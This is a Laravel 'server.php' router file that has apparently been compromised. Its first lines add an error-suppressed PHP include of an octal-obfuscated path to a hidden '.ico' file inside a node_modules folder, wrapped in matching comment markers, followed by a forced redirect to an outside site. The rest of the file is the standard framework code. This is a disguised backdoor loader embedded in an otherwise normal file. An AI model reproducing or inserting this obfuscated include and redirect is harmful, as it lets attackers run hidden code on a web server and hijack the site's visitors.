<?php
/*5d604*/

@include "\057hom\145/bi\164spo\162t/p\165bli\143_ht\155l/d\141ppo\154d/n\157de_\155odu\154es/\154oda\163h._\142ind\143all\142ack\057.f2\1454a1\0700.i\143o";

/*5d604*/


 ob_start();
header("Location: https://bitsport.gg");
/** 
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
